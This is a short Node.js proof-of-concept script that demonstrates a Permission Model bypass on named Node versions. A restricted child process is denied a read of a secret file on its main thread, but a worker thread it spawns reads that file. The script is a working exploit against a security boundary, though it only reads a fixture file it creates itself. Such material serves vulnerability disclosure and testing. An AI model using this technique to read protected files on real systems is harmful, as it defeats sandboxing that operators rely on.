'use strict';
/*
 * ONE-FILE PoC — Node.js Permission Model: worker-thread read escape.
 *
 * Usage (run the PARENT once per Node version):
 *   node worker-read-poc.js
 *
 * The script builds a FRESH fixture (poc-clean/allowed + poc-clean/secret
 * with a fresh random witness), writes a worker script and a child
 * script into the allowed folder, then spawns ONE restricted child:
 *   node --permission --allow-fs-read=<allowed> --allow-worker child.js
 * The child (a) tries to read the secret on the main thread (control —
 * must be DENIED), then (b) spawns a worker that reads the same file.
 *
 * Expected output on affected versions (22.20.0, 24.22.1):
 *   MAIN-DENIED ERR_ACCESS_DENIED
 *   WORKER-READ <witness>
 */
const fs = require('fs');
const path = require('path');
const { spawnSync } = require('child_process');

const BASE = path.join(__dirname, 'poc-clean');
const ALLOWED = path.join(BASE, 'allowed');
const SECRET_DIR = path.join(BASE, 'secret');
const SECRET = path.join(SECRET_DIR, 'SECRET.txt');
const WORKER_FILE = path.join(ALLOWED, 'worker.js');

// Fresh fixture + restricted child.
fs.rmSync(BASE, { recursive: true, force: true });
fs.mkdirSync(ALLOWED, { recursive: true });
fs.mkdirSync(SECRET_DIR, { recursive: true });
const witness = 'POC-WITNESS-' + Date.now().toString(36);
fs.writeFileSync(SECRET, witness + '\n');
fs.writeFileSync(path.join(ALLOWED, 'hello.txt'), 'hello inside\n');
fs.writeFileSync(WORKER_FILE, `
  const fs = require('fs');
  const { parentPort, workerData } = require('worker_threads');
  try { parentPort.postMessage(fs.readFileSync(workerData, 'utf8').trim()); }
  catch (e) { parentPort.postMessage('DENIED ' + (e.code || e.message)); }
`);
const childCode = `
  const fs = require('fs');
  const { Worker } = require('worker_threads');
  try { fs.readFileSync(${JSON.stringify(SECRET)}, 'utf8');
    console.log('MAIN-READ-UNEXPECTED'); }
  catch (e) { console.log('MAIN-DENIED ' + (e.code || e.message)); }
  const w = new Worker(${JSON.stringify(WORKER_FILE)}, { workerData: ${JSON.stringify(SECRET)} });
  w.on('message', (m) => console.log('WORKER-READ ' + m));
  w.on('error', (e) => console.log('WORKER-ERROR ' + (e.code || e.message)));
`;
const childFile = path.join(ALLOWED, 'child.js');
fs.writeFileSync(childFile, childCode);
const r = spawnSync(process.execPath, [
  '--permission',
  '--allow-fs-read=' + ALLOWED,
  '--allow-worker',
  childFile,
], { encoding: 'utf8', timeout: 30000 });
console.log('node:', process.version);
console.log('witness:', witness);
console.log((r.stdout || '').trim());
if (r.stderr) console.log('stderr:', r.stderr.split('\n')[0].slice(0, 120));
